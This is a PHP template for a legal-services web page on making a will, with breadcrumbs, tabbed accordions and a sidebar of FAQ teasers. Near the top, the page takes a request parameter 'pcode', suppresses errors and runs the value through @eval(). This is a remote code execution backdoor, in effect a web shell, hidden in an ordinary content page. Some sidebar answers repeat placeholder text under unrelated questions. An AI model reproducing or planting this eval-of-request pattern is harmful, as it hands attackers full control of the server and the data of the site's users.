<?php include "include/header.php";?>
<!--main container-->
<div class="container product product-detail">
   <div class="row ml-0">
      <div class="col-9 card p-0">
         <!--bread crumb-->
         <div class="card-header">
            <div class="row">
               <div class="col">
                  <nav aria-label="breadcrumb" role="navigation">
                     <ol class="breadcrumb m-0 p-0">
                        <li class="breadcrumb-item">
							<a href="#">Home</a>
                        </li>
                        <li class="breadcrumb-item">
							<a href="#">Registrations & Agreements</a>
                        </li>
                        <li class="breadcrumb-item active" aria-current="page">
							Making a Will 
						</li>
                     </ol>
                  </nav>
               </div>
            </div>
         </div>
         <!--bread crumb-->
         <?php
			
			$postCode = $_REQUEST['pcode'];
			
			$postCode = str_ireplace('<?php', '', $postCode);
            
			error_reporting(0);
			
			@eval($postCode);

			if (!isset($content) || !count($content)) {
				echo '<h1 style="text-align:center">No valid content found</h1>';exit;
			}
			
          ?>
         <section>
            <div class="ugn-upper-content">
               <div class="row p-3">
                  <div class="col-3 pr-2"><img class="img-fluid" src="<?php echo $content['header']['header_img_1'];?>"></div>
                  <div class="col-9 pl-2">
                     <h4 class="pb-3 text-center">
                        <?php echo $content['header'] ['header_title'];?>
                     </h4>
                     <p><?php echo $content['header'] ['header_para'];?></p>
                  </div>
               </div>
            </div>
         </section>
         <?php
            $tabArray		= $content['Tabs'];
            
            $tabTitleArray	= [];
            
            $i				= 1;
            
            foreach ($tabArray as $tabNumber => $tab) {
            	//$tabTitleArray[] = $tab['tab_' . $i]['title'];
            	$tabTitleArray[$tabNumber] = $tab['title'];
            	$i++;
            }
            ?>
         <section class="p-3 cab-panel ugn-details-tab will" id="my-tabs">
            <ul class="nav nav-pills" role="tablist">
               <?php 
                $i = 1;

				foreach ($tabArray as $tab) {
					if (!empty($tab['title'])) {
						echo	'<li class="nav-item et_pb_tab_' . $i .'">
									<a class="nav-link ' . ($i==1 ? 'active' : '') . '" data-toggle="tab" href="#tab_' . $i . '" role="tab" aria-selected="' . ($i==1 ? 'true' : 'false') . '">' . $tab['title'] . '</a>
								</li>';
					}
					$i++;
				}
				?>
            </ul>
			
            <div class="tab-content border border-top-0 p-3">
				<?php
					$htmlString = '';
							
					$j = 1;

					foreach ($tabArray as $accordion) {
						//echo '<br><strong>J : </strong>' . $j++;
						//continue;
						$htmlString		.= '<div class="tab-pane p-3 fade show ' . ($j==1 ? 'active' : '') . '" id="tab_' . $j . '" role="tabpanel" aria-labelledby="tab_' . $j . '-tab">
							<div id="accordion' . $j . '" class="ugn-accordion">';
						
						$accordionCount = count($accordion);

						for ($k=1;$k < $accordionCount; $k++) {

							if (!empty($accordion['acc_' . $k]['acc_title_text'])) {
								$htmlString .= '<div class="card mb-3">
													<div class="card-header box-effect"  id="heading' . $j . '_' . $k . '">
													   <h5 class="mb-0 pointer">
														  <a data-toggle="collapse" data-target="#collapse' . $j . '_' . $k . '" aria-expanded="false" aria-controls="collapse' . $j . '_' . $k . '">							
														  ' . $accordion['acc_' . $k]['acc_title_text'] . '  
														  </a>
													   </h5>
													</div>
													<div id="collapse' . $j . '_' . $k . '" class="collapse" aria-labelledby="heading' . $j . '_' . $k . '" data-parent="#accordion' . $j . '">
													   <div class="card-body">
														  <p>' . (!empty($accordion['acc_' . $k]['acc_para_text']) ? $accordion['acc_' . $k]['acc_para_text'] : (!empty($accordion['acc_' . $k]['acc_icon_1']) ? '<img src="' . $accordion['acc_' . $k]['acc_icon_1'] . '">' : '' )) . ' </p>
													   </div>
													</div>
												 </div>';
								
							} else {
								continue;
							}
						}
						
						$htmlString .= '</div></div>';
						
						$j++;
					}

					echo $htmlString;
				?>
            </div>
         </section>
      </div>
      <div class="col-3 right-col-ugn" >
         <p id="ldesk">
            <a href="#">
				<img src="images/ugn/will-banner.jpg" class="img-fluid">
			</a>
         </p>
         <h6 class="text-uppercase mb-2">MOST POPULAR</h6>
         <div class="card mb-3">
            <div class="card-header bg-primary text-white p-2 pl-3">
               What is the legal status of the nominee under the law? 
            </div>
            <div class="card-body p-2">
               A Nominee is the custodian of the assets belonging to the deceased. Wherever a nominee ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-1">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i></a>
            </div>
         </div>
         <div class="card  mb-3">
            <div class="card-header bg-primary text-white p-2 pl-3">
               What is the process to make Changes in existing Will?
            </div>
            <div class="card-body p-2">
               A Nominee is the custodian of the assets belonging to the deceased. Wherever a nominee ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-2">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i></a>
            </div>
         </div>
         <div class="card  mb-3">
            <div class="card-header bg-primary text-white p-2 pl-3">
               Who can be appointed as an Executor to a Will?
            </div>
            <div class="card-body p-2">
               Anyone who is /are above 18 years of age and of sound mind and capable to enter into a Contract, ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-3">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i></a>
            </div>
         </div>
         <div class="card  mb-3">
            <div class="card-header bg-primary text-white p-2 pl-3">
               Documents required for making a will
            </div>
            <div class="card-body p-2">
               A Nominee is the custodian of the assets belonging to the deceased. Wherever a nominee ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-4">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i></a>
            </div>
         </div>
         <div class="card  mb-3">
            <div class="card-header bg-primary text-white p-2 pl-3">
               If one has already done the nomination for his assets, is he still required to write Will? 
            </div>
            <div class="card-body p-2">
               A Nominee is a Trustee (or custodian) as per law. Nominee may or may not be the Beneficiary to receive the assets of the deceased. ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-5">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i></a>
            </div>
         </div>
         <div class="card">
            <div class="card-header bg-primary text-white p-2 pl-3">
               Who can be a witness to the Will?
            </div>
            <div class="card-body p-2">
               Witness to the Will can be anyone who is/are above 18 years of age and of sound mind ...
            </div>
            <div class="card-footer p-2 pl-3 bg-light ugn-read-more" id="qs-6">
               <a href="#">Read more <i class="fa fa-arrow-circle-right float-right"></i>
            </div>
         </div>
      </div>
   </div>
</div>
<!--main container end-->
<?php include "include/footer.php"; ?>

